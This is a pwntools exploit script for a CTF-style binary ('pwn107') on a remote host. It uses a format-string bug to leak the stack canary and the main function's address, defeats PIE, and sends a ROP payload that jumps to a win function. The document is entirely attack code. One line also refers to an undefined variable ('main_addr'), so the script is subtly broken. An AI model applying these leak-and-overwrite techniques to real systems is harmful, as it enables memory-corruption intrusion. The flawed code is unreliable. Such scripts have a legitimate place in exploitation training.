from pwn import *

elf = context.binary = ELF('./pwn107.pwn107')

MACHINE_IP = '' 	# Change this
PORT = 9007
#p = process()
p = remote(MACHINE_IP, 9007)

# Here we leak the canary and main function's address(format string vuln)
p.recvuntil(b'streak? ')
p.sendline(b"%13$p.%19$p")
p.recvuntil(b'streak: ')

output = p.recv().split(b'.')

canary = int(output[0].strip(), 16)
leaked_main_addr = int(output[1].split(b'\n')[0], 16)

base_addr = leaked_main_addr - elf.symbols.main
elf.address = base_addr

info("canary: %#x", canary)
info("leaked main addr: %#x", main_addr)
info("pie base: %#x", base_addr)

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

# padding + overwrite canary with it's own value + overwrite rbp + ret(because UBUNTU) + ret2win
padding = 0x18
payload = flat(
	padding*asm('nop'),
	canary,
	0x8*asm('nop'),
	ret_gadget,
	elf.symbols.get_streak
)

p.sendline(payload)

p.interactive()


